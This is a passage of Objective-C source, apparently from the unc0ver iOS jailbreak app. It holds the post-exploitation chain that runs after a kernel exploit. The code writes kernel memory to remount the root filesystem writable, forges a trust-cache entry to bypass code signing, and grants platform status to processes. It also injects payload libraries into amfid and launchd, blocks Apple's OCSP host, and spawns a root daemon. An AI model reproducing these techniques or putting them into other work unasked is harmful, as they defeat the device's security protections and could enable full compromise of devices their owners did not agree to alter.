        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/var/mobile/test.txt", 0, 0);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = unlink("/var/mobile/test.txt");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully wrote a test file to UserFS.");
    }
    
    {
        // Borrow entitlements from ps.
        
        LOG("Borrowing entitlements from ps...");
        borrowEntitlementsFromDonor("/bin/ps", NULL);
        LOG("Successfully borrowed entitlements from ps.");
        
        // We now have Task_for_pid.
    }
    
    {
        // Dump APTicket.
        
        LOG("Dumping APTicket...");
        if (dump_apticket) {
            rv = [[NSData dataWithContentsOfFile:@"/System/Library/Caches/apticket.der"] writeToFile:[NSString stringWithFormat:@"%@/Documents/apticket.der", NSHomeDirectory()] atomically:YES];
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 1);
        }
        LOG("Successfully dumped APTicket.");
    }
    
    {
        // Unlock nvram.
        
        LOG("Unlocking nvram...");
        rv = unlocknvram();
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully unlocked nvram.");
    }
    
    {
        // Set boot-nonce.
        
        LOG("Setting boot-nonce...");
        rv = execCommandAndWait("/usr/sbin/nvram", strdup([[NSString stringWithFormat:@"com.apple.System.boot-nonce=%s", boot_nonce] UTF8String]), NULL, NULL, NULL, NULL);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = execCommandAndWait("/usr/sbin/nvram", "IONVRAM-FORCESYNCNOW-PROPERTY=com.apple.System.boot-nonce", NULL, NULL, NULL, NULL);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully set boot-nonce.");
    }
    
    {
        // Lock nvram.
        
        LOG("Locking nvram...");
        rv = locknvram();
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully locked nvram.");
    }
    
    {
        // Initialize kexecute.
        
        LOG("Initializing kexecute...");
        init_kexecute(add_x0_x0_0x40_ret);
        LOG("Successfully initialized kexecute.");
    }
    
    {
        // Get vfs_context.
        
        LOG("Getting vfs_context...");
        vfs_context = _vfs_context(vfs_context_current, zone_map_ref);
        LOG("vfs_context: " ADDR "\n", vfs_context);
        _assert(vfs_context);
        LOG("Successfully got vfs_context.");
    }
    
    {
        // Get dev vnode.
        
        LOG("Getting dev vnode...");
        devVnode = getVnodeAtPath(vfs_context, "/dev/disk0s1s1", vnode_lookup);
        LOG("devVnode: " ADDR "\n", devVnode);
        _assert(devVnode);
        LOG("Successfully got dev vnode.");
    }
    
    {
        // Clear dev vnode's si_flags.
        
        LOG("Clearing dev vnode's si_flags...");
        wk32(rk64(devVnode + 0x78) + 0x10, 0);
        LOG("Successfully cleared dev vnode's si_flags.");
    }
    
    {
        // Clean up dev vnode.
        
        LOG("Cleaning up dev vnode...");
        rv = _vnode_put(devVnode, vnode_put);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully cleaned up dev vnode.");
    }
    
    {
        // Deinitialize kexecute.
        
        LOG("Deinitializing kexecute...");
        term_kexecute();
        LOG("Successfully deinitialized kexecute.");
    }
    
    {
        // Remount RootFS.
        
        LOG("Remounting RootFS...");
        if (snapshot_list(open("/", O_RDONLY, 0)) == -1) {
            if (!access("/var/tmp/rootfsmnt", F_OK)) {
                rv = rmdir("/var/tmp/rootfsmnt");
                LOG("rv: " "%d" "\n", rv);
                _assert(rv == 0);
            }
            rv = mkdir("/var/tmp/rootfsmnt", 0755);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            rv = spawnAndShaiHulud("/sbin/mount_apfs", "/dev/disk0s1s1", "/var/tmp/rootfsmnt", NULL, NULL, NULL);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            
            // Borrow entitlements from fsck_apfs.
            
            LOG("Borrowing entitlements from fsck_apfs...");
            borrowEntitlementsFromDonor("/sbin/fsck_apfs", NULL);
            LOG("Successfully borrowed entitlements from fsck_apfs.");
            
            // We now have fs_snapshot_rename.
            
            // Rename system snapshot.
            
            LOG("Renaming system snapshot...");
            rv = fs_snapshot_rename(open("/var/tmp/rootfsmnt", O_RDONLY, 0), systemSnapshot(copyBootHash()), "orig-fs", 0);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            LOG("Successfully renamed system snapshot.");
            
            // Reboot.
            
            LOG("Rebooting...");
            rv = reboot(0x400);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            LOG("Successfully rebooted.");
        }
        _rootvnode = rootvnode;
        rootfs_vnode = rk64(_rootvnode);
        v_mount = rk64(rootfs_vnode + 0xd8);
        v_flag = rk32(v_mount + 0x70);
        v_flag = v_flag & ~MNT_NOSUID;
        v_flag = v_flag & ~MNT_RDONLY;
        wk32(v_mount + 0x70, v_flag & ~MNT_ROOTFS);
        dev_path = "/dev/disk0s1s1";
        rv = mount("apfs", "/", MNT_UPDATE, (void *)&dev_path);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        v_mount = rk64(rootfs_vnode + 0xd8);
        wk32(v_mount + 0x70, v_flag);
        LOG("Successfully remounted RootFS.");
    }
    
    {
        // Write a test file to RootFS.
        
        LOG("Writing a test file to RootFS...");
        if (!access("/test.txt", F_OK)) {
            rv = unlink("/test.txt");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        rv = fclose(fopen("/test.txt", "w"));
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chmod("/test.txt", 0755);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/test.txt", 0, 0);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = unlink("/test.txt");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully wrote a test file to RootFS.");
    }
    
    {
        if (!access("/.bootstrapped_electra", F_OK)) {
            // Borrow entitlements from fsck_apfs.
            
            LOG("Borrowing entitlements from fsck_apfs...");
            borrowEntitlementsFromDonor("/sbin/fsck_apfs", NULL);
            LOG("Successfully borrowed entitlements from fsck_apfs.");
            
            // We now have fs_snapshot_rename.
            
            // Rename system snapshot.
            
            LOG("Renaming system snapshot back...");
            rv = fs_snapshot_rename(open("/", O_RDONLY, 0), "orig-fs", systemSnapshot(copyBootHash()), 0);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            LOG("Successfully renamed system snapshot back.");
            
            // Reboot.
            
            LOG("Rebooting...");
            rv = reboot(0x400);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            LOG("Successfully rebooted.");
        }
    }
    
    {
        // Copy over our resources to RootFS.
        
        LOG("Copying over our resources to RootFS...");
        if (access("/jb", F_OK)) {
            rv = mkdir("/jb", 0755);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            rv = chown("/jb", 0, 0);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        
        if (!access("/electra", F_OK)) {
            rv = unlink("/electra");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        rv = symlink("/jb", "/electra");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        
        rv = chdir("/jb");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        
        if (!access("/jb/amfid_payload.dylib", F_OK)) {
            rv = unlink("/jb/amfid_payload.dylib");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        a = fopen([[[NSBundle mainBundle] pathForResource:@"amfid_payload" ofType:@"tar"] UTF8String], "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a);
        untar(a, "amfid_payload");
        rv = fclose(a);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chmod("/jb/amfid_payload.dylib", 0755);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/jb/amfid_payload.dylib", 0, 0);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        
        if (!access("/jb/launchctl", F_OK)) {
            rv = unlink("/jb/launchctl");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        a = fopen([[[NSBundle mainBundle] pathForResource:@"launchctl" ofType:@"tar"] UTF8String], "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a);
        untar(a, "launchctl");
        rv = fclose(a);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chmod("/jb/launchctl", 0755);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/jb/launchctl", 0, 0);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        
        if (!access("/jb/jailbreakd.plist", F_OK)) {
            rv = unlink("/jb/jailbreakd.plist");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        rv = copyfile([[[NSBundle mainBundle] pathForResource:@"jailbreakd" ofType:@"plist"] UTF8String], "/jb/jailbreakd.plist", 0, COPYFILE_ALL);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chmod("/jb/jailbreakd.plist", 0755);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/jb/jailbreakd.plist", 0, 0);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        
        if (!access("/jb/jailbreakd", F_OK)) {
            rv = unlink("/jb/jailbreakd");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        a = fopen([[[NSBundle mainBundle] pathForResource:@"jailbreakd" ofType:@"tar"] UTF8String], "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a);
        untar(a, "jailbreakd");
        rv = fclose(a);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chmod("/jb/jailbreakd", 0755);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/jb/jailbreakd", 0, 0);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        
        if (!access("/jb/libjailbreak.dylib", F_OK)) {
            rv = unlink("/jb/libjailbreak.dylib");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        a = fopen([[[NSBundle mainBundle] pathForResource:@"libjailbreak" ofType:@"tar"] UTF8String], "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a);
        untar(a, "libjailbreak");
        rv = fclose(a);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chmod("/jb/libjailbreak.dylib", 0755);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/jb/libjailbreak.dylib", 501, 501);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        
        if (!access("/jb/pspawn_hook.dylib", F_OK)) {
            rv = unlink("/jb/pspawn_hook.dylib");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        a = fopen([[[NSBundle mainBundle] pathForResource:@"pspawn_hook" ofType:@"tar"] UTF8String], "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a);
        untar(a, "pspawn_hook");
        rv = fclose(a);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chmod("/jb/pspawn_hook.dylib", 0755);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/jb/pspawn_hook.dylib", 0, 0);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        
        if (!access("/jb/tar", F_OK)) {
            rv = unlink("/jb/tar");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        a = fopen([[[NSBundle mainBundle] pathForResource:@"tar" ofType:@"tar"] UTF8String], "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a);
        untar(a, "tar");
        rv = fclose(a);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chmod("/jb/tar", 0755);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/jb/tar", 0, 0);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        
        if (!access("/jb/gzip", F_OK)) {
            rv = unlink("/jb/gzip");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        a = fopen([[[NSBundle mainBundle] pathForResource:@"gzip" ofType:@"tar"] UTF8String], "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a);
        untar(a, "gzip");
        rv = fclose(a);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chmod("/jb/gzip", 0755);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/jb/gzip", 0, 0);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        
        if (!access("/var/tmp/strap.tgz", F_OK)) {
            rv = unlink("/var/tmp/strap.tgz");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        rv = copyfile([[[NSBundle mainBundle] pathForResource:@"strap" ofType:@"tgz"] UTF8String], "/var/tmp/strap.tgz", 0, COPYFILE_ALL);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chmod("/var/tmp/strap.tgz", 0755);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/var/tmp/strap.tgz", 0, 0);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully copied over our resources to RootFS.");
    }
    
    {
        // Inject trust cache
        
        printf("trust_chain = 0x%llx\n", trust_chain);
        
        struct trust_mem mem;
        mem.next = rk64(trust_chain);
        *(uint64_t *)&mem.uuid[0] = 0xabadbabeabadbabe;
        *(uint64_t *)&mem.uuid[8] = 0xabadbabeabadbabe;
        
        rv = grab_hashes("/jb", kread, amficache, mem.next);
        printf("rv = %d, numhash = %d\n", rv, numhash);
        
        size_t length = (sizeof(mem) + numhash * 20 + 0xFFFF) & ~0xFFFF;
        uint64_t kernel_trust = kmem_alloc(length);
        printf("alloced: 0x%zx => 0x%llx\n", length, kernel_trust);
        
        mem.count = numhash;
        kwrite(kernel_trust, &mem, sizeof(mem));
        kwrite(kernel_trust + sizeof(mem), allhash, numhash * 20);
        wk64(trust_chain, kernel_trust);
        
        free(allhash);
        free(allkern);
        free(amfitab);
    }
    
    {
        // Platformize myself, amfid and launchd.
        
        LOG("Platformizing myself, amfid and launchd...");
        rv = platformizeMe();
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = platformizeProcAtAddr(getProcStructForPid(findPidOfProcess("amfid")));
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = platformizeProcAtAddr(getProcStructForPid(1));
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully platformized myself, amfid and launchd.");
    }
    
    {
        // Patch amfid.
        
        LOG("Patching amfid...");
        rv = inject_library(findPidOfProcess("amfid"), "/jb/amfid_payload.dylib");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        sleep(2);
        rv = access("/var/tmp/amfid_payload.alive", F_OK);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully patched amfid.");
    }
    
    {
        // Set HSP4.
        
        LOG("Setting HSP4...");
        rv = remap_tfp0_set_hsp4(&tfp0, zone_map_ref);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully set HSP4.");
    }
    
    {
        // Spawn jailbreakd.
        
        LOG("Spawning jailbreakd...");
        if (!access("/usr/lib/libjailbreak.dylib", F_OK)) {
            rv = unlink("/usr/lib/libjailbreak.dylib");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        rv = symlink("/jb/libjailbreak.dylib", "/usr/lib/libjailbreak.dylib");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        if (!access("/bin/launchctl", F_OK)) {
            rv = unlink("/bin/launchctl");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        rv = rename("/jb/launchctl", "/bin/launchctl");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/jb/jailbreakd.plist"];
        _assert(md);
        md[@"EnvironmentVariables"][@"KernelBase"] = [NSString stringWithFormat:@ADDR, kernel_base];
        md[@"EnvironmentVariables"][@"KernProcAddr"] = [NSString stringWithFormat:@ADDR, rk64(findKernelSymbol("_kernproc"))];
        md[@"EnvironmentVariables"][@"ZoneMapOffset"] = [NSString stringWithFormat:@ADDR, zone_map_ref - (kernel_base - KERNEL_SEARCH_ADDRESS)];
        md[@"EnvironmentVariables"][@"AddRetGadget"] = [NSString stringWithFormat:@ADDR, add_x0_x0_0x40_ret];
        md[@"EnvironmentVariables"][@"OSBooleanTrue"] = [NSString stringWithFormat:@ADDR, OSBoolean_True];
        md[@"EnvironmentVariables"][@"OSBooleanFalse"] = [NSString stringWithFormat:@ADDR, OSBoolean_False];
        md[@"EnvironmentVariables"][@"OSUnserializeXML"] = [NSString stringWithFormat:@ADDR, osunserializexml];
        md[@"EnvironmentVariables"][@"Smalloc"] = [NSString stringWithFormat:@ADDR, smalloc];
        rv = [md writeToFile:@"/jb/jailbreakd.plist" atomically:YES];
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 1);
        rv = execCommandAndWait("/bin/launchctl", "load", "/jb/jailbreakd.plist", NULL, NULL, NULL);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        sleep(2);
        rv = access("/var/tmp/jailbreakd.pid", F_OK);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully spawned jailbreakd.");
    }
    
    {
        // Patch launchd.
        
        if (!access("/usr/lib/pspawn_hook.dylib", F_OK)) {
            rv = unlink("/usr/lib/pspawn_hook.dylib");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        rv = symlink("/jb/pspawn_hook.dylib", "/usr/lib/pspawn_hook.dylib");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Patching launchd...");
        if (load_tweaks) {
            rv = inject_library(1, "/usr/lib/pspawn_hook.dylib");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        LOG("Successfully patched launchd.");
    }
    
    {
        // Update version string.
        
        LOG("Updating version string...");
        rv = updateVersionString(DEFAULT_VERSION_STRING, tfp0, kernel_base);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = updateVersionString(DEFAULT_VERSION_STRING, tfp0, kernel_base);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully updated version string.");
    }
    
    {
        // Extract bootstrap.
        
        LOG("Extracting bootstrap...");
        rv = chdir("/var/tmp");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = execCommandAndWait("/jb/gzip", "-d", "/var/tmp/strap.tgz", NULL, NULL, NULL);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = unlink("/jb/gzip");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        if (access("/.installed_unc0ver", F_OK)) {
            rv = chdir("/");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            rv = execCommandAndWait("/jb/tar", "-xvpkf", "/var/tmp/strap.tar", NULL, NULL, NULL);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 512 || rv == 0);
            rv = fclose(fopen("/.installed_unc0ver", "w"));
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            rv = chmod("/.installed_unc0ver", 0755);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            rv = chown("/.installed_unc0ver", 0, 0);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            run_uicache = 1;
        }
        rv = unlink("/jb/tar");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = unlink("/var/tmp/strap.tar");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully extracted bootstrap.");
    }
    
    {
        // Disable stashing.
        
        LOG("Disabling stashing...");
        if (access("/.cydia_no_stash", F_OK)) {
            rv = fclose(fopen("/.cydia_no_stash", "w"));
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            rv = chmod("/.cydia_no_stash", 0755);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            rv = chown("/.cydia_no_stash", 0, 0);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        LOG("Successfully disabled stashing.");
    }
    
    {
        // Block ocsp.apple.com.
        
        LOG("Blocking ocsp.apple.com...");
        printf("%s\n", readFile("/etc/hosts"));
        blockDomainWithName("ocsp.apple.com");
        printf("%s\n", readFile("/etc/hosts"));
        LOG("Successfully blocked ocsp.apple.com.");
    }
    
    {
        // Allow SpringBoard to show non-default system apps.
        
        LOG("Allowing SpringBoard to show non-default system apps...");
        rv = kill(findPidOfProcess("cfprefsd"), SIGSTOP);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
        _assert(md);
        md[@"SBShowNonDefaultSystemApps"] = @(YES);
        rv = [md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 1);
        rv = kill(findPidOfProcess("cfprefsd"), SIGKILL);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully allowed SpringBoard to show non-default system apps.");
    }
    
    {
        // Load Daemons.
        
        LOG("Loading Daemons...");
        if (load_daemons) {
            dsystem("echo 'really jailbroken';ls /Library/LaunchDaemons | while read a; do launchctl load /Library/LaunchDaemons/$a; done; ls /etc/rc.d | while read a; do /etc/rc.d/$a; done;");
        }
        LOG("Successfully loaded Daemons.");
    }
    
    {
        // Run uicache.
        
        LOG("Running uicache...");
        if (run_uicache) {
            rv = execCommandAndWait("/usr/bin/uicache", NULL, NULL, NULL, NULL, NULL);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        LOG("Successfully ran uicache.");
    }
    
    {
        // Load Tweaks.
        
        LOG("Loading Tweaks...");
        if (load_tweaks) {
            rv = reSpring();
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        LOG("Successfully loaded Tweaks.");
    }
}

- (IBAction)tappedOnJailbreak:(id)sender
{
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0ul), ^{
        dispatch_async(dispatch_get_main_queue(), ^{
            [self.goButton setEnabled:NO];
            [self.goButton setTitle:@"Exploiting..." forState:UIControlStateDisabled];
            [self.tabBarController.tabBar setUserInteractionEnabled:NO];
        });
        // Initialize kernel exploit.
        LOG("Initializing kernel exploit...");
        switch ([[NSUserDefaults standardUserDefaults] integerForKey:@K_EXPLOIT]) {
            case 0: {
                vfs_sploit();
                break;
            }
            
            case 1: {
                mptcp_go();
                break;
            }
            case 2: {
                break;
            }
                
            default: {
                break;
            }
        }
        // Validate TFP0.
        LOG("Validating TFP0...");
        _assert(MACH_PORT_VALID(tfp0));
        LOG("Successfully validated TFP0.");
        exploit(tfp0, (uint64_t)get_kernel_base(tfp0), [[NSUserDefaults standardUserDefaults] boolForKey:@K_TWEAK_INJECTION], [[NSUserDefaults standardUserDefaults] boolForKey:@K_LOAD_DAEMONS], [[NSUserDefaults standardUserDefaults] boolForKey:@K_DUMP_APTICKET], [[NSUserDefaults standardUserDefaults] boolForKey:@K_REFRESH_ICON_CACHE], [[[NSUserDefaults standardUserDefaults] objectForKey:@K_BOOT_NONCE] UTF8String]);
        dispatch_async(dispatch_get_main_queue(), ^{
            [self.goButton setTitle:@"Done, exit." forState:UIControlStateDisabled];
        });
    });
}

+ (NSURL *)getURLForUserName:(NSString *)userName {
    if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"tweetbot://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"tweetbot:///user_profile/%@", userName]];
    } else if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"twitterrific://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"twitterrific:///profile?screen_name=%@", userName]];
    } else if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"tweetings://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"tweetings:///user?screen_name=%@", userName]];
    } else if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"twitter://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"https://mobile.twitter.com/%@", userName]];
    } else {
        return [NSURL URLWithString:[NSString stringWithFormat:@"https://mobile.twitter.com/%@", userName]];
    }
}

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.
    [self.goButton addTarget:self action:@selector(tappedOnJailbreak:) forControlEvents:UIControlEventTouchUpInside];
    struct utsname u = { 0 };
    uname(&u);
    if (strstr(u.version, DEFAULT_VERSION_STRING)) {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0ul), ^{
            dispatch_async(dispatch_get_main_queue(), ^{
                [self.goButton setTitle:@"Jailbroken" forState:UIControlStateDisabled];
                [self.goButton setEnabled:NO];
            });
        });
    }
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

- (UIStatusBarStyle)preferredStatusBarStyle {
    return UIStatusBarStyleDefault;
}

- (IBAction)tappedOnPwn:(id)sender{
    [[UIApplication sharedApplication] openURL:[ViewController getURLForUserName:@"Pwn20wnd"] options:@{} completionHandler:nil];
}

- (IBAction)tappedOnDennis:(id)sender{
    [[UIApplication sharedApplication] openURL:[ViewController getURLForUserName:@"DennisBednarz"] options:@{} completionHandler:nil];
}

- (IBAction)tappedOnSam:(id)sender{
    [[UIApplication sharedApplication] openURL:[ViewController getURLForUserName:@"sbingner"] options:@{} completionHandler:nil];
}

@end
